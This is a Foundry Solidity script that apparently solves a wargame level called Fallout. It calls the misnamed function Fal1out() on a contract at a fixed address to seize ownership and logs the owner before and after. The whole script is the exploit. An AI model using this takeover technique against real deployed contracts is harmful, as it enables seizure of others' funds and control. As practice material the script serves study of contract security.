// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import{Script,console} from "forge-std/Script.sol";
import{Fallout} from "../src/Level2.sol";

contract Level2Solution is Script{
        Fallout level2=Fallout(0xC026DeE87bc2Ba7A30458880f02cAde512D1E411);
        function run() public{
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            console.log("before owner:",level2.owner());
            level2.Fal1out();
            console.log("after owner:",level2.owner());
            vm.stopBroadcast();
        }
}